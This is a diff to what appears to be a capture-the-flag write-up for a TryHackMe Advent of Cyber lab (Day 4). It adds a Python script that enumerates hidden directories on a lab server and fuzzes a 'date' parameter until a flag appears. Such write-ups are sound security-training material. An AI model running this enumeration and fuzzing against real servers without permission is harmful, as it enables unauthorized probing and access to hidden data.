@@ -339,10 +339,79 @@ Flag is THM{885ff...9d8fe99ad1a}
 ```
 
 ## Day 4 ##
-- Web
-- Santa's watching
-- Exploit Santa's login form and obtain admin credentials to save Santa's nice list!
-- Authorization Bypass
+
+### Santa's watching - web exploitation
+
+> You're going to learn how to use Gobuster to enumerate a web server for hidden files and folders to aid in the recovery of Elf's forums. Later on, you're going to be introduced to an important technique that is fuzzing, where you will have the opportunity to put theory into practice.
+
+So, this one could be automated, but I added one cheat to let it run faster since I did not feel like writing a threaded application. I did not use gobuster or wfuzz like the learning objectives, since my goal is to python it if possible. The cheat was to assume "api" was in the folder name cutting the list from ~20,000 to 28.
+
+![](../assets/images/adventofcyber/day4-site.png)
+
+Here are the highlights:
+- Read in all words from the provided wordlists
+- Use all words that contain "api" and test url + word
+- If the status code is not `404`, save that word
+- Access the site at url + saved word, its a directory listing
+- Grab all links to other files
+- Itierate over those file using the dates from the wordlist as date parameter
+- Match the output for the TryHackMe Flag
+- Profit!
+
+
+```python
+#!/usr/bin/env python3
+
+import requests
+from bs4 import BeautifulSoup as bs
+import re
+
+url = 'http://10.10.44.41/'
+flagpatt = re.compile('THM{[^}]*}')
+
+s = requests.session()
+
+with open('big.txt') as f:
+    big = f.read().splitlines()
+
+for b in big:
+    if 'api' in b:
+        r = s.get(url + b)
+        if r.status_code != 404:
+            break
+
+api = b
+
+r = s.get(url + b)
+
+soup = bs(r.text,features='lxml')
+
+links = []
+for link in soup.findAll('a', attrs={'href': re.compile("\w*\.\w*")}):
+    links.append(link.get('href'))
+
+with open('wordlist') as f:
+    fuzzes = f.read().splitlines()
+
+for link in links:
+    r = s.get(url + link)
+    for fuzz in fuzzes:
+        r = s.get(url + api + '/' + link, params={'date':fuzz})
+        match = flagpatt.findall(r.text)
+        if match:
+            print(f'Working file in /{api} found at {link}')
+            print(f'flag {match[0]} found at {fuzz}')
+            break
+```
+
+Running the script provides the following output with the answers redacted.
+
+```
+$ ./solve.py
+/api got a 200
+Working file in /api found at si........og.php
+flag THM{D4...1} found at 20201125
+```
 
 ## Day 5 ##
 - Web
